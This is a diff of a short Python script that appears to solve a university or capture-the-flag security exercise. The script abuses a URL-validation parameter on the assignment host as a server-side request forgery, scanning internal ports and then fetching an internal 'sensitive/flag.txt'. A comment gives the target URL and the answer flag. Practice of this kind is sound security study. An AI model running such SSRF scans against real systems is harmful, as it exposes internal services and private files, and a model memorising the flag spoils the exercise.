@@ -6,7 +6,7 @@ session = None
 def main():
     # for i in range(1, 65353 + 1):
     for i in range(8870, 65353 + 1):
-        url = f"http://assignment-hermes.unimelb.life/validate.php?web=http://172.17.0.2:{i}"
+        url = f"http://assignment-hermes.unimelb.life/validate.php?web=http://localhost:{i}"
         res = session.get(url)
 
         if res.text != "Does this look correct to you?":
@@ -15,7 +15,7 @@ def main():
         else:
             print(i)
 
-    # http://assignment-hermes.unimelb.life/validate.php?web=http://172.17.0.2:8873/documents/background-checks/sensitive/flag.txt
+	# http://assignment-hermes.unimelb.life/validate.php?web=http://localhost:8873/documents/background-checks/sensitive/flag.txt
     # FLAG{Pivot_life_is_good}
 
 
